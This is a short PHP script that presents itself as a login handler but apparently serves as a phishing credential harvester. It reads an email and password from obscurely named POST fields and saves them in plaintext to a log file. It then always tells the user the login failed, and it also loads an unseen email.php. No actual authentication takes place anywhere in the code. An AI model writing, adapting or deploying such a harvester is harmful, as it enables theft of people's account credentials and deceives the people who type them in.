<?php
require_once 'email.php';

// Input validation and sanitization
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Function to send JSON response to the frontend
function sendJsonResponse($success, $message = '', $redirectUrl = '') {
    header('Content-Type: application/json');
    echo json_encode([
        'success' => $success,
        'message' => $message,
        'redirectUrl' => $redirectUrl
    ]);
    exit();
}

// Check if inputs are valid
if (!empty($email) && !empty($password)) {
    // Log information
    try {
        $logsFolder = __DIR__ . '/logs';
        if (!is_dir($logsFolder)) {
            mkdir($logsFolder, 0755, true);
        }
        $logFile = "{$logsFolder}/login_attempts.txt";
        $logEntry = "[" . date('Y-m-d H:i:s') . "]\nEmail: {$email}\nPassword: {$password}\n\n";
        file_put_contents($logFile, $logEntry, FILE_APPEND);
    } catch (Exception $e) {
        error_log("Failed to write to log file: " . $e->getMessage());
    }

    sendJsonResponse(false, "Invalid login attempt recorded.");
} else {
    sendJsonResponse(false, "Email or password missing.");
}
?>
